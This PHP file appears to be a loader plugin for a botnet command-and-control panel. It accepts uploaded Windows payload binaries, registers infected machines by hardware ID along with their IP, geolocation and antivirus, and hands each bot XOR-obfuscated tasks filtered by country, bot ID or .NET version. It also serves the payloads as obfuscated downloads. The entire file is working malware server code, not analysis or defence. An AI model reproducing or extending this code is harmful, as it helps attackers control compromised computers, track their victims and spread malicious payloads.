<?php

use GeoIp2\Database\Reader;

class Main_tiny
{
    public function __construct()
    {
        $GLOBALS["template"][0] = get_plugin_base_dir("tiny_loader") . "/template/Main_tiny";
    }

    function is_valid_pe($file)
    {
        $contents = file_get_contents($file['tmp_name']);
        $size     = $file['size'];
        if($size < 1024)
            return false;
        if($contents[0] != 'M' || $contents[1] != 'Z')
            return false;
        return true;
    }

    public function tiny_loader()
    {

        $CONST_PRIVATE_FOLDER = 'uploads/';
        $CONST_X64_BIN_PATH   = $CONST_PRIVATE_FOLDER.'x64.bin';
        $CONST_X86_BIN_PATH   = $CONST_PRIVATE_FOLDER.'x86.bin';

        if(isset($_FILES['x64_bin']))
        {

            if($_FILES['x64_bin']['error'] != UPLOAD_ERR_OK || $_FILES['x86_bin']['error'] != UPLOAD_ERR_OK)
                die("Error");
            else if($this->is_valid_pe($_FILES['x64_bin']) && $this->is_valid_pe($_FILES['x86_bin']))
            {
                move_uploaded_file($_FILES['x64_bin']['tmp_name'], $CONST_X64_BIN_PATH);
                move_uploaded_file($_FILES['x86_bin']['tmp_name'], $CONST_X86_BIN_PATH);
            }
            else
                echo('<div class="error">Invalid PE file</div>');
        }


    }


    function xor_obf($str, $key)
    {
        $out = '';
        for ($i = 0; $i < strlen($str); ++$i)
            $out .= ($str[$i] ^ $key[$i % strlen($key)]);
        return $out;
    }
    private function getUserIP() {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];

        if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
        elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; }
        else { $ip = $remote; }

        return $ip;
    }
    public function tiny_request()
    {


        $uhid = strtoupper(key($_GET));
        $key = sha1($uhid);
        $data = file_get_contents('php://input');

        if (strlen($data) === 0) {
            echo($key);
            exit();
        }

        $reader = new Reader(__DIR__ . '/../../../src/Geo/GeoLite2-City.mmdb');

        $ip = $this->getUserIP();
        try{
            $record = $reader->city($ip);
            $country = $record->country->isoCode;
            $countryName = $record->country->name;
            $countryCity = $record->city->name;
            $countryLatitude = $record->location->latitude;
            $countryLongitude = $record->location->longitude;
        }catch (Exception $e){
            $country = "unknow";
            $countryLatitude = "unknow";
            $countryLongitude = "unknow";
            $countryName = "unknow";
        }


        $data = $this->xor_obf($data, $key);
        $parts = explode('|', $data, 2); //bin|int32 // bin|int64   // ping
        $requestType = $parts[0];


        if ($requestType == 'ping') {

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
            $statement->execute(array($uhid));
            while ($row = $statement->fetch()) {
                $botfound = true;
                $bot = $row;
            }


            if(empty($postbot["spreadtag"])){
                $postbot["spreadtag"] = "none";
            }
            if(empty($postbot["antivirus"])){
                $postbot["antivirus"] = "none";
            }else{
                $postbot["antivirus"] = base64_decode($postbot["antivirus"]);
            }


            $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP(), ip = ?, version = ?, country = ?, spreadtag = ?, countryName = ?, antivirus = ?  WHERE hwid = ?");
            $statement->execute(array($ip,"melt_version",  $country, trim($postbot["spreadtag"]),$countryName,$postbot["antivirus"],$uhid));
            $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks  WHERE task = 'dande' ORDER BY id");
            while ($com = $cmds->fetch(PDO::FETCH_ASSOC)) {
                if ($com['status'] == "1") {
                    //$executions = $GLOBALS["pdo"]->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
                    $executions_querry = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as executions FROM tasks_completed WHERE taskid = :i");
                    $executions_querry->execute(array(":i" => $com['id']));
                    if($com["execution_limit"] != 0 && $executions_querry->fetchColumn(0) >= $com["execution_limit"]){
                        continue;
                    }
                    $ae = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
                    $ae->execute(array(":i" => $com['id'], ":h" => $uhid));
                    if ($ae->fetchColumn(0) == 0) {
                        //TODO FILTER CHECKING
                        //CHECK if Filter is Empty
                        if (!empty($com["filter"])) {
                            //Check if Filter is none
                            if ($com["filter"] != "[]") {
                                //Filter to array
                                $filter = json_decode($com["filter"], true);
                                if (is_array($filter)) {
                                    // Search Country in Filter if not found die
                                    if (!empty($filter["country"])) {
                                        if (strpos( $filter["country"], $country ) !== false) {

                                            //Country Possible check current countries and difference
                                            if($com["execution_limit"] > 1){
                                                $mixArray = explode(", ",$filter["country"]);
                                                $botsDifference = number_format($com["execution_limit"] / count($mixArray),0);
                                                $executions_querry = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as executions FROM tasks_completed
                                                    LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
                                                     WHERE tasks_completed.taskid = :i AND bots.country = :country");
                                                $executions_querry->execute(array(":i" => $com['id'],":country" => $country));
                                                if($executions_querry->fetchColumn(0) >= $botsDifference){
                                                    continue;
                                                }
                                            }
                                            //continue;
                                        }else{
                                            continue;
                                        }
                                    }

                                    //Check if Bot Only Ececution
                                    if (!empty($filter["onlybot"])) {
                                        if ($filter["onlybot"] != $bot["id"]) {
                                            continue;
                                        }
                                    }

                                    //Check if Bot Multi Ececution
                                    if (!empty($filter["multibot"])) {
                                        $bots = explode(",",$filter["multibot"]);
                                        foreach($bots as $execute_on_id){
                                            if (intval($execute_on_id) != intval($bot["id"])) {
                                                continue;
                                            }
                                        }
                                    }

                                    if (!empty($filter["version"])) {
                                        if ($filter["version"] != $bot["version"]) {
                                            continue;
                                        }
                                    }

                                    if (!empty($filter["netFramwork"])) {

                                        $framworkHelper = "";
                                        if ($postbot["netFramework2"] == "true") {
                                            $framworkHelper .= " net2 ";
                                        }

                                        if ($postbot["netFramework3"] == "true") {
                                            $framworkHelper .= " net3 ";
                                        }

                                        if ($postbot["netFramework35"] == "true") {
                                            $framworkHelper .= " net35 ";
                                        }

                                        if ($postbot["netFramework4"] == "true") {
                                            $framworkHelper .= " net4 ";
                                        }

                                        $frameworks = explode(",", $filter["netFramwork"]);
                                        $allow = false;
                                        foreach ($frameworks as $framework) {
                                            if (preg_match('/\b' . trim($framework) . '\b/', $framworkHelper)) {
                                                $allow = true;
                                            }
                                        }

                                        if (!$allow) {
                                            continue;
                                        }
                                    }
                                }
                            }
                        }
                        $output = '0|'.$com["command"]."\r\n";
                        echo $this->xor_obf($output, $key);
                        //send taskID

                        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks_completed (bothwid, taskid, status) VALUES (?, ?, ?)");
                        $statement->execute(array($uhid, $com["id"], "send"));
                        //insert Send
                        // Get Executed or Failed
                        die();
                        break;
                    }
                }
            }

        } else if ($requestType == 'info') {

            $parts = explode('|', $parts[1]);
            $botfound = false;
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
            $statement->execute(array($uhid));
            while ($row = $statement->fetch()) {
                $botfound = true;
                $bot = $row;
            }

            if(!$botfound){
                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                if (!empty($postbot["antivirus"])) {
                    $avcheck = base64_decode($postbot["antivirus"]);
                } else {
                    $avcheck = "none";
                }


                $statement->execute(array(
                    $avcheck,
                    $uhid,
                    $parts[4],
                    $country,
                    "none",
                    "none",
                    "none",
                    "none",
                    $countryLatitude,
                    $countryLongitude,
                    $countryName,
                    "",
                    "",
                    "",
                    1,
                    $parts[6],
                    $ip,
                    $parts[0] . " " .$parts[1].  $parts[2] ,
                    "melt_version"
                ));
            }




        } else if ($requestType == 'bin') {
            $CONST_PRIVATE_FOLDER = 'uploads/';
            $CONST_X64_BIN_PATH   = $CONST_PRIVATE_FOLDER.'x64.bin';
            $CONST_X86_BIN_PATH   = $CONST_PRIVATE_FOLDER.'x86.bin';
            $path = '';
            if ($parts[1] === 'int32')
                $path = $CONST_X86_BIN_PATH;
            else
                $path = $CONST_X64_BIN_PATH;
            $content = file_get_contents($path);
            echo $this->xor_obf($content, $key);
        }



        die();
    }
}